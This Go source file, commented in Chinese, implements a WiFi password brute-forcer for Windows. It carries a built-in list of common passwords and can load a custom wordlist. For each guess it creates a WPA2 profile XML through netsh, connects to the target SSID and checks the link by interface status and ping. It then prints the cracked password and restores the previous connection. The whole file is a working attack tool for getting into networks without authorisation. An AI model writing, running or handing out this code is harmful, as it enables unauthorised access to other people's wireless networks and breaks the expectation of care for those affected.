package wifi

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

// 内置的小密码词典
var defaultPasswords = []string{
	"12345678", "00000000", "123456789", "1234567890", "11111111", "88888888", "66666666", "123123123", "1q2w3e4r", "1qaz2wsx"}

// BruteForceResult 表示爆破结果
type BruteForceResult struct {
	SSID           string
	TestedCount    int
	Success        bool
	Password       string
	ElapsedTime    time.Duration
	FailedAttempts []string
}

// BruteForceWiFi 对指定的WiFi网络进行密码爆破
func BruteForceWiFi(ssid string, customDictPath string, maxAttempts int) (*BruteForceResult, error) {
	startTime := time.Now()

	// 保存当前网络连接状态
	originalNetwork, isConnected := getCurrentNetworkConnection()
	if isConnected {
		fmt.Printf("当前已连接到网络: %s\n", originalNetwork)
	} else {
		fmt.Println("当前未连接到任何网络")
	}

	// 准备密码列表
	var passwords []string

	// 如果提供了自定义密码本，则加载它
	if customDictPath != "" {
		customPasswords, err := loadCustomDictionary(customDictPath)
		if err != nil {
			return nil, fmt.Errorf("加载自定义密码本失败: %v", err)
		}
		passwords = customPasswords
	} else {
		// 否则使用默认密码列表
		passwords = defaultPasswords
	}

	// 如果设置了最大尝试次数，则限制密码列表长度
	if maxAttempts > 0 && maxAttempts < len(passwords) {
		passwords = passwords[:maxAttempts]
	}

	result := &BruteForceResult{
		SSID:           ssid,
		TestedCount:    0,
		Success:        false,
		FailedAttempts: []string{},
	}

	// 尝试每个密码
	for _, password := range passwords {
		result.TestedCount++

		// 尝试连接WiFi
		success, err := tryWiFiPassword(ssid, password, maxAttempts)
		if err != nil {
			fmt.Printf("尝试密码 '%s' 时出错: %v\n", password, err)
			result.FailedAttempts = append(result.FailedAttempts, password)
			continue
		}

		if success {
			result.Success = true
			result.Password = password

			// 恢复原有网络连接状态
			if isConnected {
				fmt.Printf("密码破解成功: %s，正在恢复原有网络连接: %s\n", password, originalNetwork)
				time.Sleep(2 * time.Second) // 给一些时间让当前连接稳定
				restoreCmd := exec.Command("netsh", "wlan", "connect", "name="+originalNetwork)
				restoreOutput, err := restoreCmd.CombinedOutput()
				if err != nil {
					fmt.Printf("恢复原有网络连接失败: %v, 输出: %s\n", err, string(restoreOutput))
				} else {
					fmt.Printf("已恢复原有网络连接: %s\n", originalNetwork)
				}
			} else {
				// 如果原来未连接网络，则断开当前连接
				fmt.Println("密码破解成功: " + password + "，原来未连接网络，正在断开当前连接...")
				disconnectCmd := exec.Command("netsh", "wlan", "disconnect")
				disconnectOutput, err := disconnectCmd.CombinedOutput()
				if err != nil {
					fmt.Printf("断开连接失败: %v, 输出: %s\n", err, string(disconnectOutput))
				} else {
					fmt.Println("已断开连接")
				}
			}

			break
		} else {
			result.FailedAttempts = append(result.FailedAttempts, password)
		}
	}

	result.ElapsedTime = time.Since(startTime)
	return result, nil
}

// loadCustomDictionary 从文件加载自定义密码字典
func loadCustomDictionary(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer func(file *os.File) {
		err := file.Close()
		if err != nil {

		}
	}(file)

	var passwords []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		password := strings.TrimSpace(scanner.Text())
		if password != "" {
			passwords = append(passwords, password)
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return passwords, nil
}

// tryWiFiPassword 尝试使用指定的密码连接WiFi
func tryWiFiPassword(ssid, password string, maxAttempts int) (bool, error) {
	// 创建临时的WiFi配置文件，设置为不记住密码
	// 使用原始SSID作为配置文件名，避免使用后缀可能导致的连接问题
	profileName := ssid
	profileXML := fmt.Sprintf(`<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
	<name>%s</name>
	<SSIDConfig>
		<SSID>
			<hex>%x</hex>
			<name>%s</name>
		</SSID>
		<nonBroadcast>false</nonBroadcast>
	</SSIDConfig>
	<connectionType>ESS</connectionType>
	<connectionMode>manual</connectionMode>
	<autoSwitch>false</autoSwitch>
	<MSM>
		<security>
			<authEncryption>
				<authentication>WPA2PSK</authentication>
				<encryption>AES</encryption>
				<useOneX>false</useOneX>
			</authEncryption>
			<sharedKey>
				<keyType>passPhrase</keyType>
				<protected>false</protected>
				<keyMaterial>%s</keyMaterial>
			</sharedKey>
		</security>
	</MSM>
	<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
		<enableRandomization>false</enableRandomization>
	</MacRandomization>
</WLANProfile>`, profileName, []byte(ssid), ssid, password)

	// 创建临时文件
	tempFile := fmt.Sprintf("%s_temp.xml", strings.ReplaceAll(ssid, " ", "_"))
	err := os.WriteFile(tempFile, []byte(profileXML), 0644)
	if err != nil {
		return false, fmt.Errorf("创建临时配置文件失败: %v", err)
	}
	defer func() {
		// 确保临时XML文件被删除
		err := os.Remove(tempFile)
		if err != nil {
			return
		}
		// 确保临时配置文件被删除
		deleteCmd := exec.Command("netsh", "wlan", "delete", "profile", "name="+profileName)
		err = deleteCmd.Run()
		if err != nil {
			return
		} // 忽略错误，尽力删除
	}()

	// 添加WiFi配置文件
	addCmd := exec.Command("netsh", "wlan", "add", "profile", "filename="+tempFile)
	_, err = addCmd.CombinedOutput()
	if err != nil {
		return false, fmt.Errorf("添加WiFi配置文件失败: %v", err)
	}

	// 尝试连接WiFi
	fmt.Printf("尝试密码: %s\n", password)

	// 先断开当前连接，确保不会受到现有连接的影响
	disconnectCmd := exec.Command("netsh", "wlan", "disconnect")
	err = disconnectCmd.Run()
	if err != nil {
		return false, err
	} // 忽略错误
	time.Sleep(3 * time.Second)

	// 连接到目标网络
	connectCmd := exec.Command("netsh", "wlan", "connect", "name="+profileName)
	connectOutput, err := connectCmd.CombinedOutput()
	if err != nil {
		fmt.Printf("连接命令执行失败: %v, 输出: %s\n", err, string(connectOutput))
		return false, nil
	}

	connectOutputStr := string(connectOutput)
	//fmt.Printf("连接命令输出: %s\n", connectOutputStr)

	// 如果连接命令输出包含成功信息，继续进行验证
	if strings.Contains(connectOutputStr, "成功") || strings.Contains(strings.ToLower(connectOutputStr), "success") {
		//fmt.Println("连接命令返回成功，等待连接建立...")
		time.Sleep(3 * time.Second) // 给予一些时间让连接建立
	} else {
		fmt.Println("连接命令未返回成功信息")
		return false, nil
	}

	// 检查连接状态
	statusCmd := exec.Command("netsh", "wlan", "show", "interfaces")
	statusOutput, err := statusCmd.CombinedOutput()
	if err != nil {
		fmt.Printf("获取状态失败: %v\n", err)
		return false, nil
	}

	statusStr := string(statusOutput)
	statusLower := strings.ToLower(statusStr)
	ssidLower := strings.ToLower(ssid)

	// 检查是否连接到了目标SSID
	if strings.Contains(statusLower, ssidLower) {
		//fmt.Println("找到目标SSID在接口状态中")

		// 检查是否有明显的连接状态
		if strings.Contains(statusLower, "已连接") || strings.Contains(statusLower, "connected") {
			fmt.Println("状态显示为已连接")
			fmt.Printf("连接成功！密码: %s\n", password)
			return true, nil
		} else if strings.Contains(statusLower, "已断开") || strings.Contains(statusLower, "disconnected") {
			fmt.Println("状态显示为已断开，密码可能错误")
			return false, nil
		} else {
			// 如果状态不明确，尝试ping测试
			//fmt.Println("连接状态不明确，尝试ping测试...")
			pingCmd := exec.Command("ping", "-n", "1", "-w", "1000", "8.8.8.8")
			pingOutput, _ := pingCmd.CombinedOutput()
			pingStr := string(pingOutput)

			if strings.Contains(pingStr, "TTL=") || strings.Contains(pingStr, "时间=") || strings.Contains(pingStr, "time=") {
				fmt.Println("Ping测试成功，连接应该已建立")
				fmt.Printf("连接成功！密码: %s\n", password)
				return true, nil
			} else {
				//fmt.Println("Ping测试失败，密码可能错误")
				return false, nil
			}
		}
	} else {
		//fmt.Println("未找到目标SSID在接口状态中，密码可能错误")
		return false, nil
	}
}

// getCurrentNetworkConnection 获取当前连接的网络名称
func getCurrentNetworkConnection() (string, bool) {
	cmd := exec.Command("netsh", "wlan", "show", "interfaces")
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Printf("获取当前网络连接状态失败: %v\n", err)
		return "", false
	}

	outputStr := string(output)
	lines := strings.Split(outputStr, "\n")

	var ssid string
	var connected bool

	for _, line := range lines {
		line = strings.TrimSpace(line)

		// 检查SSID行
		if strings.Contains(line, "SSID") && !strings.Contains(line, "BSSID") {
			parts := strings.Split(line, ":")
			if len(parts) >= 2 {
				ssid = strings.TrimSpace(parts[1])
			}
		}

		// 检查状态行
		if strings.Contains(line, "状态") || strings.Contains(line, "State") {
			if strings.Contains(line, "已连接") || strings.Contains(line, "connected") {
				connected = true
			}
		}
	}

	return ssid, connected && ssid != ""
}

// FormatBruteForceResult 格式化爆破结果
func FormatBruteForceResult(result *BruteForceResult) string {
	var output strings.Builder
	output.WriteString(fmt.Sprintf("=== WiFi密码爆破结果 - %s ===\n\n", time.Now().Format("2006-01-02 15:04:05")))
	output.WriteString(fmt.Sprintf("目标SSID: %s\n", result.SSID))
	output.WriteString(fmt.Sprintf("尝试密码数量: %d\n", result.TestedCount))
	output.WriteString(fmt.Sprintf("耗时: %s\n\n", result.ElapsedTime))

	if result.Success {
		output.WriteString(fmt.Sprintf("爆破成功!\n密码: %s\n", result.Password))
	} else {
		output.WriteString("爆破失败，未找到正确密码。\n")
		output.WriteString("\n尝试过的密码:\n")
		for i, password := range result.FailedAttempts {
			output.WriteString(fmt.Sprintf("  %d. %s\n", i+1, password))
		}
	}

	return output.String()
}
